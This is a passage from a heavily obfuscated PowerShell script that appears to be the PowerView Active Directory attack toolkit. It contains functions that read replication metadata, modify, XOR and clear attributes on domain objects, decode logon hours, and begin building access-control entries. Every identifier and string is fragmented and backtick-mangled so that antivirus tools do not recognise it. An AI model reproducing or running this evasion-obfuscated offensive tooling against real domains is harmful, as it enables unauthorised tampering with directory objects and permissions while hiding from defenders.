            'Raw'           =   ${T`RUe}
        }
        if (${PsbOU`NDpa`RaM`e`T`ers}[("{0}{1}"-f'Domai','n')]) { ${S`EAr`CHERA`R`gumE`NTS}[("{0}{1}{2}"-f'Do','ma','in')] = ${D`O`MAiN} }
        if (${PSb`OunDpa`R`AM`ETERS}[("{0}{2}{1}"-f'LD','PFilter','A')]) { ${S`EarCHE`R`Ar`GuMEntS}[("{0}{2}{1}" -f 'LDAPFi','er','lt')] = ${LDa`P`F`iLTer} }
        if (${PsB`oUNDPA`Ra`met`eRs}[("{2}{1}{0}{3}"-f'h','earc','S','Base')]) { ${s`earChERArGUm`E`Nts}[("{2}{0}{1}" -f'r','chBase','Sea')] = ${SE`ARc`hBa`Se} }
        if (${p`sBO`U`NdParAMetE`Rs}[("{0}{1}{2}" -f 'S','erve','r')]) { ${SeaRcHer`AR`g`UME`NTS}[("{0}{1}"-f 'Serv','er')] = ${S`ervER} }
        if (${pSBouN`D`PAR`AMEtERS}[("{0}{3}{1}{2}"-f 'S','archScop','e','e')]) { ${Searc`H`E`R`ARgU`menTS}[("{1}{2}{0}"-f 'e','S','earchScop')] = ${SE`ArcH`Sco`PE} }
        if (${P`SB`oun`dparAMET`E`Rs}[("{3}{0}{1}{2}{4}"-f 'ult','Page','Siz','Res','e')]) { ${SE`Ar`C`hErAR`guMenTs}[("{0}{2}{1}{3}"-f'ResultPa','eSiz','g','e')] = ${r`ESult`PAGE`SI`ze} }
        if (${psb`OuNd`p`AR`AMe`TeRs}[("{2}{1}{0}{3}" -f 'verTimeL','r','Se','imit')]) { ${sE`ARc`hERARGU`m`eNTS}[("{2}{3}{0}{1}{4}"-f 'Li','m','S','erverTime','it')] = ${seR`Ver`TiME`L`i`mIT} }
        if (${pSb`o`UnDPA`RamETERS}[("{1}{0}{2}" -f 'mbs','To','tone')]) { ${seAR`cHe`RaRgU`ME`Nts}[("{1}{2}{0}" -f 'stone','To','mb')] = ${t`OMB`sTOnE} }
        if (${PSbOU`NdPARa`Me`TerS}[("{1}{2}{0}"-f'One','F','ind')]) { ${Se`Ar`cheRaRgU`MeNTS}[("{1}{2}{0}"-f 'e','F','indOn')] = ${fiN`donE} }
        if (${PSbound`paRa`Me`TerS}[("{1}{0}{2}"-f 'rede','C','ntial')]) { ${sea`R`CHERAR`gUme`NtS}[("{2}{0}{1}" -f 'tia','l','Creden')] = ${c`Red`entI`AL} }

        if (${psBO`U`NDpa`Ra`meterS}[("{1}{0}{2}"-f 'rop','P','erties')]) {
            ${PRopE`R`T`yfILteR} = ${PsBOUN`D`p`ArAMeTers}[("{1}{0}{2}"-f'rti','Prope','es')] -Join '|'
        }
        else {
            ${p`Ro`pERTYFi`lT`Er} = ''
        }
    }

    PROCESS {
        if (${psB`OU`NDPAra`Me`TErs}[("{0}{1}"-f 'Id','entity')]) { ${sea`R`CH`ErARgume`N`Ts}[("{0}{1}"-f 'Ide','ntity')] = ${ID`en`TITY} }

        &("{0}{4}{3}{2}{1}"-f 'Ge','ect','inObj','a','t-Dom') @SearcherArguments | &("{2}{1}{0}{3}"-f'rEac','o','F','h-Object') {
            ${objEC`Tdn} = ${_}."pRo`Per`Ties"[("{0}{2}{3}{1}{4}"-f 'di','e','s','tinguish','dname')][0]
            ForEach(${XM`lNoDe} in ${_}."p`RO`PERTies"[("{5}{1}{6}{2}{4}{0}{3}"-f 'ributemetad','s-re','lat','ata','t','msd','p')]) {
                ${t`e`MpObJ`ect} = [xml]${x`MLNode} | &("{2}{0}{1}"-f 't-Ob','ject','Selec') -ExpandProperty ("{3}{1}{5}{4}{0}{2}" -f '_DAT','EPL_AT','A','DS_R','TA','TR_ME') -ErrorAction ("{0}{2}{1}{3}"-f'Si','entlyCon','l','tinue')
                if (${temp`O`BJECt}) {
                    if (${Te`mpO`BjE`Ct}."PsZAt`TrIB`UTeN`AmE" -Match ${P`ROpErt`yFI`lt`eR}) {
                        ${oU`T`put} = &("{1}{2}{0}"-f 'ject','N','ew-Ob') ("{1}{2}{0}" -f'ject','P','SOb')
                        ${oUT`pUT} | &("{1}{2}{3}{0}" -f 'Member','Ad','d','-') ("{3}{2}{1}{0}" -f 'y','rt','pe','NotePro') ("{0}{1}{2}" -f'O','b','jectDN') ${obJE`C`TDn}
                        ${o`Ut`puT} | &("{2}{0}{1}" -f 'dd-Membe','r','A') ("{0}{1}{2}" -f 'NotePro','p','erty') ("{1}{2}{0}" -f 'e','Att','ributeNam') ${t`eM`PObJECt}."PSzAttRI`BuT`E`N`AmE"
                        ${O`UtPUT} | &("{0}{1}{2}" -f 'Add-','M','ember') ("{1}{0}{2}" -f'Pr','Note','operty') ("{2}{3}{1}{0}" -f'e','tingChang','Last','Origina') ${tE`MPObJe`Ct}."ftiM`ELAStor`i`G`InAt`iNg`ChA`Nge"
                        ${ou`Tp`Ut} | &("{0}{2}{1}" -f'Add-Me','r','mbe') ("{0}{2}{1}"-f 'NotePrope','ty','r') ("{1}{0}{2}"-f'si','Ver','on') ${tEmP`OBje`CT}."Dwve`R`SIon"
                        ${o`U`TpuT} | &("{2}{0}{1}"-f '-Membe','r','Add') ("{0}{2}{1}{3}"-f 'No','r','teP','operty') ("{5}{0}{4}{3}{2}{1}" -f 'stO','saDN','D','inating','rig','La') ${T`EMpO`BJect}."pszLaSt`o`RigInat`inGd`SADn"
                        ${OuT`p`Ut}."PS`ObJE`ct"."tY`pE`Names".("{1}{0}"-f'nsert','I').Invoke(0, ("{6}{5}{0}{3}{7}{4}{2}{1}{8}"-f 't','eHistor','but','Att','i','DObjec','PowerView.A','r','y'))
                        ${o`UtPut}
                    }
                }
                else {
                    &("{1}{0}{2}"-f 'Ve','Write-','rbose') ('[Get'+'-Domai'+'nOb'+'jec'+'t'+'At'+'t'+'ribut'+'eHistory'+'] '+'Er'+'ror '+'r'+'e'+'trieving '+('qrl'+'m'+'s'+'ds-replat'+'tr'+'ibuteme'+'ta'+'data'+'qr'+'l ')."rEp`laCe"('qrl',[STring][chAr]39)+'fo'+'r '+"'$ObjectDN'")
                }
            }
        }
    }
}

function g`Et-Dom`AIno`BJECTl`InKEDaT`T`RibuTEHistoRY {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{6}{4}{3}{5}{2}{7}{0}{1}{8}"-f'Mor','eThan','dVa','eDeclar','Us','e','PS','rs','Assignments'}, '')]
    [OutputType({"{1}{4}{3}{5}{6}{0}{2}"-f 'or','PowerView.ADObjectLi','y','kedAttributeHi','n','s','t'})]
    [CmdletBinding()]
    Param(
        [Parameter(posITioN = 0, VaLuEfromPIPELine = ${tr`Ue}, valUefroMpiPElINebyprOPERTYnAMe = ${T`RUe})]
        [Alias({"{1}{3}{0}{2}" -f 'shedN','Dis','ame','tingui'}, {"{0}{3}{2}{1}"-f'Sa','ntName','cou','mAc'}, {"{0}{1}"-f 'N','ame'}, {"{5}{4}{0}{6}{2}{3}{1}"-f 'in','ame','sh','edN','t','MemberDis','gui'}, {"{1}{2}{0}{3}" -f'a','Memb','erN','me'})]
        [String[]]
        ${i`DeNTI`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`omaIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f 'ilte','F','r'})]
        [String]
        ${l`dAp`FIlT`ER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PRo`P`Erties},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'AD','SPat','h'})]
        [String]
        ${Se`ARC`hb`Ase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}{4}{3}"-f'in','Co','Doma','r','ntrolle'})]
        [String]
        ${S`erVeR},

        [ValidateSet({"{0}{1}"-f'Ba','se'}, {"{0}{1}"-f 'O','neLevel'}, {"{1}{0}" -f'btree','Su'})]
        [String]
        ${SeAr`Chsc`o`Pe} = ("{0}{1}" -f 'Subtr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`Su`LTpag`eS`IZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`ER`VERT`ImEL`ImIt},

        [Switch]
        ${TOMBs`T`ONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REd`EnTiAL} =   ( &("{1}{2}{0}"-f'LE','g','Et-varIAb') ("{1}{0}" -f'n','PKfEz'))."vA`LuE"::"e`MPtY",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${SeARc`HERa`Rgu`menTS} = @{
            ("{3}{2}{0}{1}"-f'rt','ies','rope','P')    =   ("{4}{2}{1}{5}{3}{0}"-f 'adata','r','-','t','msds','eplvalueme'),("{0}{1}{4}{2}{5}{3}"-f 'disti','n','u','ame','g','ishedn')
            'Raw'           =   ${t`RuE}
        }
        if (${PsBoUNd`PARa`ME`TeRS}[("{2}{0}{1}"-f 'omai','n','D')]) { ${sEArCHeRAr`guM`en`TS}[("{1}{2}{0}"-f'main','D','o')] = ${d`omAin} }
        if (${pSB`o`U`NdpA`RamET`ers}[("{2}{0}{1}"-f 'i','lter','LDAPF')]) { ${SearcheRa`R`G`U`mENTS}[("{0}{1}{2}"-f'LDA','PFilte','r')] = ${l`D`ApfiLtEr} }
        if (${Psb`oUNDPa`RAME`T`e`RS}[("{0}{2}{1}" -f'S','archBase','e')]) { ${sea`Rc`Her`ARguME`Nts}[("{2}{0}{1}" -f 'archBas','e','Se')] = ${searCh`B`Ase} }
        if (${pS`BoundpAR`Am`ET`E`RS}[("{1}{0}"-f 'erver','S')]) { ${SEa`R`chE`RARg`UmeN`Ts}[("{1}{0}" -f 'r','Serve')] = ${Serv`ER} }
        if (${Psbo`UNDPAR`AMe`TE`RS}[("{1}{0}{2}"-f'Scop','Search','e')]) { ${S`E`ARcHERAr`GU`MentS}[("{1}{0}{2}{3}"-f 'a','Se','rchScop','e')] = ${seARCh`SC`o`pE} }
        if (${pSBOU`N`dP`A`RAMEteRs}[("{2}{3}{1}{0}" -f 'ageSize','ultP','Re','s')]) { ${SEa`RcHER`ArgUM`eNts}[("{0}{1}{2}"-f 'R','e','sultPageSize')] = ${r`esULtP`AGe`siZE} }
        if (${Ps`B`O`UNd`P`ARameTERs}[("{1}{4}{2}{0}{3}"-f 'm','Serv','rTimeLi','it','e')]) { ${SE`A`RCheRaRgUm`eNTS}[("{2}{3}{0}{4}{1}" -f'rTimeLi','it','S','erve','m')] = ${S`E`RvErtI`mEL`Imit} }
        if (${pSBou`Nd`PaRA`mEtERS}[("{1}{2}{0}" -f'e','T','ombston')]) { ${SEAR`Ch`ErARGUM`E`NTS}[("{1}{0}{3}{2}"-f 'o','T','e','mbston')] = ${TOMBS`TO`NE} }
        if (${pS`B`oun`DPA`RAM`etERS}[("{1}{0}{2}{3}"-f'dent','Cre','i','al')]) { ${SEarC`hERaRgUm`e`Nts}[("{1}{0}{3}{2}"-f 're','C','l','dentia')] = ${cRE`DenT`I`Al} }

        if (${psBoU`Nd`Para`METErS}[("{2}{1}{0}" -f'ies','opert','Pr')]) {
            ${pRO`perT`Y`FiLtER} = ${PSBoUNDP`ARAme`T`ers}[("{1}{0}{2}" -f'operti','Pr','es')] -Join '|'
        }
        else {
            ${pr`oPeRT`y`FiLter} = ''
        }
    }

    PROCESS {
        if (${PsBO`UnDPArame`T`ERs}[("{2}{1}{0}" -f 'ty','nti','Ide')]) { ${seA`RC`HeRarGUM`eNts}[("{0}{1}" -f 'Ide','ntity')] = ${IdeN`T`I`Ty} }

        &("{4}{0}{1}{3}{2}"-f 'et','-Doma','Object','in','G') @SearcherArguments | &("{1}{0}{3}{2}" -f'orE','F','bject','ach-O') {
            ${o`BJECT`DN} = ${_}."P`ROpERT`IEs"[("{3}{0}{2}{1}"-f 'stin','shedname','gui','di')][0]
            ForEach(${xM`LNoDE} in ${_}."pr`o`PERtieS"[("{2}{0}{4}{3}{1}" -f'ds-re','ta','ms','ada','plvaluemet')]) {
                ${te`mPobJ`eCt} = [xml]${x`M`lnOdE} | &("{3}{2}{1}{0}" -f'ct','Obje','t-','Selec') -ExpandProperty ("{3}{4}{2}{1}{0}" -f 'A','_DAT','META','DS_REPL_','VALUE_') -ErrorAction ("{2}{1}{0}{3}" -f'yContinu','l','Silent','e')
                if (${T`E`mPOBJE`ct}) {
                    if (${TEmP`O`BJeCt}."pszat`TRI`BUte`NA`me" -Match ${pR`op`erTyFI`L`TEr}) {
                        ${O`UtP`UT} = &("{2}{1}{3}{0}" -f 'ect','O','New-','bj') ("{2}{1}{0}"-f'ct','bje','PSO')
                        ${ou`T`PUT} | &("{2}{3}{0}{1}" -f 'e','r','A','dd-Memb') ("{0}{1}{3}{2}" -f 'N','otePro','erty','p') ("{2}{0}{1}"-f 'e','ctDN','Obj') ${obj`e`Ct`DN}
                        ${OUTP`Ut} | &("{0}{2}{1}" -f 'A','mber','dd-Me') ("{0}{1}{2}" -f 'Not','ePrope','rty') ("{0}{1}{4}{3}{2}"-f'Attri','bu','me','eNa','t') ${T`EM`poBJeCt}."p`s`zaTtR`IBUTenAME"
                        ${oU`Tp`Ut} | &("{0}{1}{2}{3}" -f 'A','d','d','-Member') ("{1}{2}{0}{3}"-f'ope','No','tePr','rty') ("{2}{0}{1}{3}" -f 'tri','buteVa','At','lue') ${TE`m`pObje`CT}."P`sZ`oBject`dN"
                        ${O`UT`pUt} | &("{2}{1}{0}"-f 'r','e','Add-Memb') ("{2}{0}{1}" -f 'Prope','rty','Note') ("{1}{3}{0}{2}"-f 'eat','TimeC','ed','r') ${tEmPobJ`e`Ct}."FtI`MecRE`Ated"
                        ${Out`p`UT} | &("{2}{0}{1}{3}"-f'-Me','mbe','Add','r') ("{0}{2}{1}"-f 'NotePrope','ty','r') ("{3}{0}{2}{1}" -f 'l','ed','et','TimeDe') ${tEmPob`J`E`cT}."f`TIm`eD`elEtEd"
                        ${OUtP`Ut} | &("{2}{1}{3}{0}" -f 'er','d-','Ad','Memb') ("{2}{0}{1}"-f'o','perty','NotePr') ("{2}{1}{0}{4}{5}{3}"-f'tOrig','as','L','nge','inati','ngCha') ${T`e`M`poBjECT}."FtimeLa`st`origI`NaTI`Ng`ChAN`Ge"
                        ${o`U`TpuT} | &("{2}{1}{0}" -f 'er','dd-Memb','A') ("{1}{2}{0}{3}" -f'ert','Note','Prop','y') ("{0}{1}" -f'Ver','sion') ${TEmP`OBJe`ct}."dwverS`i`ON"
                        ${o`UtpUT} | &("{1}{0}{2}" -f'dd-M','A','ember') ("{2}{3}{0}{1}" -f 'rope','rty','Note','P') ("{3}{4}{1}{0}{5}{2}" -f'gDs','atin','N','LastOrig','in','aD') ${Te`MPObJE`Ct}."p`sZlaSToRiGiNA`T`I`NGd`SaDn"
                        ${oUt`P`UT}."Ps`obJ`ECT"."tY`penAmeS".("{1}{0}"-f 'sert','In').Invoke(0, ("{0}{4}{1}{2}{6}{3}{5}" -f 'PowerVie','tLi','nked','tor','w.ADObjec','y','AttributeHis'))
                        ${o`UtPUt}
                    }
                }
                else {
                    &("{1}{0}{3}{2}" -f'te-V','Wri','rbose','e') ('['+'Get-Doma'+'inO'+'b'+'jectLi'+'nke'+'dAttributeHis'+'tory] '+'E'+'rror '+'retrie'+'vin'+'g '+('{0'+'}msds'+'-repl'+'va'+'luem'+'et'+'ad'+'ata{0'+'} ')  -f  [chaR]39+'for'+' '+"'$ObjectDN'")
                }
            }
        }
    }
}

function set-D`om`AI`NObJ`E`Ct {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{7}{11}{8}{0}{6}{3}{1}{9}{5}{10}{2}" -f'd','han','s','sForStateC','P','gFunc','Proces','SU','l','gin','tion','seShou'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{4}{2}{3}" -f 'PSS','h','ce','ss','ouldPro'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(poSITION = 0, MANdAtOrY = ${Tr`UE}, vaLuefrOMPIpElinE = ${t`RUE}, VALuefROMPIpelIneBYPRopertynAME = ${t`RUe})]
        [Alias({"{1}{3}{2}{0}" -f'dName','Di','ishe','stingu'}, {"{1}{2}{0}"-f 'ntName','Sam','Accou'}, {"{1}{0}"-f'me','Na'})]
        [String[]]
        ${ide`NT`iTY},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f 'lace','Re','p'})]
        [Hashtable]
        ${S`eT},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${x`OR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cl`Ear},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Dom`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'r','Filte'})]
        [String]
        ${LdAPf`iLt`ER},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}" -f 'Pat','h','ADS'})]
        [String]
        ${SE`ARChB`AsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{4}{1}{3}{2}"-f 'Dom','ontr','ller','o','ainC'})]
        [String]
        ${SeRv`er},

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{2}{1}{0}" -f'el','neLev','O'}, {"{1}{0}"-f'ubtree','S'})]
        [String]
        ${sEA`RcH`sco`PE} = ("{1}{0}"-f 'e','Subtre'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ReS`ULt`paGe`s`IZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SErV`eRTIMEL`IMIt},

        [Switch]
        ${t`oM`BStoNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`Ede`NTIaL} =   (&('Ls') ("{3}{0}{1}{2}"-f 'RIAblE:','pKFeZ','n','va') )."V`AluE"::"E`MPTY"
    )

    BEGIN {
        ${s`E`ARchERa`RGU`m`EnTs} = @{'Raw' = ${Tr`UE}}
        if (${PSBoU`NDP`AR`Am`E`TeRs}[("{1}{2}{0}" -f'ain','D','om')]) { ${se`ArC`heRaRgUmE`NtS}[("{1}{0}{2}" -f'o','D','main')] = ${do`maiN} }
        if (${pSb`OuNDPa`RAM`EterS}[("{0}{3}{2}{1}"-f'LDAPFi','r','e','lt')]) { ${searCHE`R`A`RGUM`EnTS}[("{0}{2}{1}" -f 'LDAP','r','Filte')] = ${lDA`PFi`L`TER} }
        if (${ps`BoUN`d`p`AraMETe`RS}[("{2}{0}{1}"-f 'ea','rchBase','S')]) { ${SeaR`cherArG`U`me`NTS}[("{2}{0}{1}" -f'hB','ase','Searc')] = ${S`EAr`CHb`ASe} }
        if (${PSb`o`U`Nd`PaRAmeters}[("{1}{0}" -f'rver','Se')]) { ${sea`RCH`Erar`GUMENTS}[("{1}{0}"-f 'er','Serv')] = ${se`Rv`eR} }
        if (${P`sbound`Pa`RA`mET`eRs}[("{1}{3}{0}{2}"-f 'hS','S','cope','earc')]) { ${SeArcH`e`RArgum`Ents}[("{0}{1}{2}" -f 'SearchS','c','ope')] = ${SeA`RC`hs`CopE} }
        if (${psb`oUNDParAMET`E`Rs}[("{0}{2}{1}"-f'R','ize','esultPageS')]) { ${sE`ARcHerarGUM`E`N`TS}[("{1}{3}{0}{2}" -f'ltP','R','ageSize','esu')] = ${r`ESuLT`PAG`ESIzE} }
        if (${PSBOuND`pAR`AME`TerS}[("{1}{2}{3}{0}"-f 't','ServerT','im','eLimi')]) { ${sEa`RcH`ER`Arg`UMENTs}[("{1}{4}{3}{0}{2}"-f 'me','S','Limit','i','erverT')] = ${ser`VeR`TiMEL`I`miT} }
        if (${PSbOUNDp`Ar`Am`eTeRS}[("{2}{0}{1}"-f'o','ne','Tombst')]) { ${SeArCher`ARGU`m`eN`Ts}[("{2}{1}{3}{0}"-f 'e','mbs','To','ton')] = ${tOM`BSt`One} }
        if (${psBound`P`A`Ram`ETeRS}[("{3}{0}{2}{1}" -f'e','al','denti','Cr')]) { ${sEAr`c`h`eRaRgUM`enTS}[("{0}{3}{1}{2}" -f 'Creden','ia','l','t')] = ${CrE`dE`NTI`Al} }
    }

    PROCESS {
        if (${p`sbOUnDPaRaM`E`Te`RS}[("{2}{0}{1}" -f 'ti','ty','Iden')]) { ${sEarChE`RARgUm`e`NtS}[("{1}{0}" -f 'tity','Iden')] = ${Ide`Nt`ItY} }

        ${rA`WOBjE`CT} = &("{0}{3}{4}{2}{1}" -f'Get-D','bject','ainO','o','m') @SearcherArguments

        ForEach (${O`B`JecT} in ${r`A`WoBJECT}) {

            ${Ent`Ry} = ${R`AwoB`JE`cT}.("{1}{2}{4}{5}{3}{0}"-f'try','G','et','oryEn','Dire','ct').Invoke()

            if(${pSbOUnDPA`R`AME`TeRS}['Set']) {
                try {
                    ${PsBO`U`ND`p`ARAmETErs}['Set'].("{2}{1}{0}"-f'r','tEnumerato','Ge').Invoke() | &("{0}{1}{2}{3}{4}"-f'F','orEach-','Ob','je','ct') {
                        &("{3}{1}{0}{2}" -f'e','it','-Verbose','Wr') "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)' "
                        ${ent`Ry}.("{1}{0}" -f 'ut','p').Invoke(${_}."nA`ME", ${_}."v`ALUe")
                    }
                    ${EN`TRy}.("{1}{3}{2}{0}"-f 's','comm','ge','itchan').Invoke()
                }
                catch {
                    &("{2}{0}{1}" -f '-','Warning','Write') "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if(${psboUnDpA`R`AM`Ete`RS}['XOR']) {
                try {
                    ${pSbo`Und`PAra`metERs}['XOR'].("{0}{3}{1}{4}{2}"-f'GetEnum','ra','r','e','to').Invoke() | &("{2}{1}{3}{4}{0}"-f'ct','Each-O','For','b','je') {
                        ${PropER`T`YnA`mE} = ${_}."na`mE"
                        ${P`RoPER`T`YXORV`ALUE} = ${_}."vA`Lue"
                        &("{0}{3}{1}{2}"-f'Write-V','r','bose','e') "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)' "
                        ${TyPena`mE} = ${En`TRY}.${p`ROpE`RTyNaMe}[0].("{0}{1}" -f 'G','etType').Invoke()."N`AME"

                        ${P`ROp`ERTYv`A`lUe} = $(${eNt`RY}.${pROp`Er`TyNA`ME}) -bxor ${PrOperTY`XOR`VA`l`UE}
                        ${EnT`Ry}.${p`RO`peRtY`NamE} = ${pro`pEr`TYVA`lUe} -as ${tYp`en`Ame}
                    }
                    ${E`Nt`RY}.("{0}{2}{1}" -f 'com','itchanges','m').Invoke()
                }
                catch {
                    &("{1}{2}{0}{3}" -f 'a','Writ','e-W','rning') "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if(${psbo`UN`dP`Ar`AmEte`Rs}[("{0}{1}"-f 'Cle','ar')]) {
                try {
                    ${psB`Ou`ND`paraM`ETerS}[("{0}{1}" -f 'Cl','ear')] | &("{3}{1}{0}{2}" -f'-Ob','h','ject','ForEac') {
                        ${ProPe`R`Ty`NamE} = ${_}
                        &("{1}{2}{0}" -f 'Verbose','Wri','te-') "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)' "
                        ${e`NTrY}.${Pro`pErt`yn`AME}.("{1}{0}"-f'ar','cle').Invoke()
                    }
                    ${E`Ntry}.("{1}{0}{3}{2}" -f'tcha','commi','s','nge').Invoke()
                }
                catch {
                    &("{2}{0}{1}" -f 'ite-W','arning','Wr') "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
        }
    }
}

function C`oNve`RTfrO`M-`l`d`APLo`GONhOUrS {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{8}{0}{7}{4}{10}{5}{9}{3}{6}{2}" -f 'e','P','ents','i','red','a','gnm','cla','SUseD','rsMoreThanAss','V'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{4}{3}{2}{1}" -f'PSShould','ss','oce','r','P'}, '')]
    [OutputType({"{0}{1}{3}{2}"-f 'PowerView.L','ogo','ours','nH'})]
    [CmdletBinding()]
    Param (
        [Parameter( VAluEFRoMpIPeline = ${tR`UE}, vALUefROmpIpEliNeByPROPerTYName = ${TR`Ue})]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        ${L`OG`o`NhOUrsarrAY}
    )

    Begin {
        if(${l`oGONHOuR`s`ARR`Ay}."c`OUnt" -ne 21) {
            throw ("{8}{1}{4}{7}{6}{3}{2}{0}{9}{5}" -f 'ect len','on','corr','the in','Hours','th','ay is ','Arr','Log','g')
        }

        function coN`VeRTT`O-Lo`GON`hO`U`RsA`RrAY {
            Param (
                [int[]]
                ${H`OuRS`Arr}
            )

            ${lo`gOnh`o`URS} = &("{1}{2}{0}"-f 'bject','New','-O') ("{1}{0}"-f 'ool[]','b') 24
            for(${I}=0; ${i} -lt 3; ${I}++) {
                ${by`Te} = ${HO`URs`ArR}[${I}]
                ${of`FSeT} = ${I} * 8
                ${S`Tr} =   ${e6`A0}::("{2}{0}{1}"-f'n','g','ToStri').Invoke(${B`YTE},2).("{1}{0}"-f'ft','PadLe').Invoke(8,'0')

                ${L`og`OnHOurS}[${oFF`S`et}+0] = [bool]  ${E6`A0}::"ToI`Nt32"([string]${s`TR}[7])
                ${LOGO`N`HO`UrS}[${oFfs`eT}+1] = [bool]   ${E`6a0}::"t`OINt32"([string]${S`Tr}[6])
                ${Log`o`NHOUrs}[${off`SEt}+2] = [bool]  (&("{0}{2}{1}" -f 'vaR','BLE','iA')  ('E'+'6a0') )."vA`lUE"::"ToiN`T32"([string]${S`TR}[5])
                ${LO`GOnH`oUrs}[${o`FF`set}+3] = [bool]  ( &("{0}{1}"-f 'VA','riAbLE')  ("{1}{0}"-f'0','e6A')  )."vAL`UE"::"T`OIn`T32"([string]${S`Tr}[4])
                ${lOg`O`NhOU`RS}[${oF`FsEt}+4] = [bool]   (&("{2}{1}{0}"-f'e','ArIABL','v') ("{1}{0}" -f'0','e6A'))."VAl`Ue"::"t`OI`NT32"([string]${S`Tr}[3])
                ${loG`ONho`UrS}[${oF`FS`eT}+5] = [bool]  ${E6`A0}::"T`o`INT32"([string]${s`TR}[2])
                ${lO`gonH`oUrs}[${o`FF`SeT}+6] = [bool]   ${e6`A0}::"T`oINT`32"([string]${S`Tr}[1])
                ${lOG`o`NHou`Rs}[${oFFs`eT}+7] = [bool]  (  &("{0}{1}"-f 'gc','I') ("{4}{2}{3}{0}{1}" -f 'e:E','6a0','riA','bL','va')  )."v`AlUE"::"T`oiNt32"([string]${S`Tr}[0])
            }

            ${L`oGON`HourS}
        }
    }

    Process {
        ${O`UtpUt} = @{
            ("{1}{0}" -f'unday','S') = &("{2}{5}{6}{4}{3}{1}{0}"-f'y','Arra','Conv','s','r','ert','To-LogonHou') -HoursArr ${logO`NhOuR`s`ArrAY}[0..2]
            ("{1}{0}"-f'day','Mon') = &("{2}{3}{5}{0}{1}{4}"-f'u','rsAr','Convert','To-','ray','LogonHo') -HoursArr ${l`ogonHoUrsa`RraY}[3..5]
            ("{0}{1}" -f'T','uesday') = &("{0}{4}{1}{5}{6}{2}{3}"-f 'C','ou','Arr','ay','onvertTo-LogonH','r','s') -HoursArr ${l`o`GonHoU`RsARR`Ay}[6..8]
            ("{2}{0}{1}" -f'dnesd','ay','We') = &("{6}{0}{3}{4}{1}{5}{2}"-f'tTo-','nHou','Array','Lo','go','rs','Conver') -HoursArr ${log`On`HOU`Rs`AR`RaY}[9..11]
            ("{1}{0}"-f'hurs','T') = &("{2}{4}{1}{0}{3}" -f 'a','o-LogonHoursArr','Conver','y','tT') -HoursArr ${L`ogON`houRSarr`AY}[12..14]
            ("{2}{0}{1}" -f 'i','day','Fr') = &("{4}{0}{1}{6}{5}{2}{3}"-f'n','v','ursArr','ay','Co','ogonHo','ertTo-L') -HoursArr ${lOgo`NHou`RSa`RRAy}[15..17]
            ("{1}{2}{0}" -f 'day','Sat','ur') = &("{3}{4}{0}{2}{1}" -f 'onHou','ay','rsArr','Conv','ertTo-Log') -HoursArr ${lOg`ONHOUrS`AR`R`AY}[18..20]
        }

        ${O`Ut`pUT} = &("{1}{2}{0}"-f'ect','New','-Obj') ("{2}{1}{0}"-f 'ject','b','PSO') -Property ${Out`put}
        ${OUt`PuT}."PSO`Bj`EcT"."t`YpE`N`AmES".("{1}{0}{2}"-f 'er','Ins','t').Invoke(0, ("{0}{5}{4}{1}{2}{3}" -f 'PowerV','ogon','H','ours','.L','iew'))
        ${O`UT`Put}
    }
}

function neW-A`doBJ`ECTAcCeSSCoN`T`R`OlenTRY {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{8}{1}{9}{6}{4}{0}{7}{2}{3}" -f 'C','P','io','ns','ate','PSUse','rSt','hangingFunct','Should','rocessFo'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{3}{1}"-f'PSShouldPr','ess','o','c'}, '')]
    [OutputType({"{3}{1}{4}{2}{7}{5}{8}{0}{10}{6}{12}{11}{9}"-f 'Con','t','.Se','Sys','em','it','r','cur','y.Access','nRule','t','atio','ol.Authoriz'})]
    [CmdletBinding()]
    Param (
        [Parameter(posiTIoN = 0, VAlUeFromPIpElIne = ${T`RUE}, ValuEFrOMPiPeLiNEByPRoPERTynaME = ${tr`Ue}, mAndATOrY = ${tr`Ue})]
        [Alias({"{0}{3}{4}{2}{1}"-f'D','hedName','nguis','is','ti'}, {"{2}{1}{0}{3}" -f'cc','A','Sam','ountName'}, {"{0}{1}" -f 'N','ame'})]
        [String]
        ${p`Rin`CiPal`id`eNTI`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${PRInC`Ipa`lD`O`MaIN},

